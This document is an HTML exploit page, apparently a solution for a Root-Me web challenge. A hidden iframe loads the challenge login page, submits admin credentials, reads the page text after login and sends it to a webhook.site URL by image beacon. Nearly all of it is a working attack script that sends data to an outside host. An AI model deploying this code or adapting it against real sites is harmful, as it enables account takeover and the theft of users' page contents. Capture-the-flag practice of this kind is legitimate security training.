<!DOCTYPE html>
<html>
<head><title>SOME Exploit</title></head>
<body>
  <h1>Chargement...</h1>
  <iframe id="target" src="http://challenge01.root-me.org:58010/login" style="display:none;" onload="steal()"></iframe>
  <script>
    function steal() {
      const frame = document.getElementById("target");

      try {
        const doc = frame.contentWindow.document;
        doc.querySelector("#username").value = "admin";
        doc.querySelector("#secret").value = "toto";
        doc.querySelector("form").submit();

        setTimeout(() => {
          try {
            const text = frame.contentWindow.document.body.innerText;
            sendLeak(text);
          } catch (e) {
            sendLeak("post-login erreur: " + e);
          }
        }, 1000);

      } catch (e) {
        sendLeak("initial access error: " + e);
      }
    }

    function sendLeak(leak) {
      const url = "https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b?data=" + encodeURIComponent(leak);
      const img = new Image();
      img.src = url;
      document.body.appendChild(img);
    }
  </script>
</body>
</html>
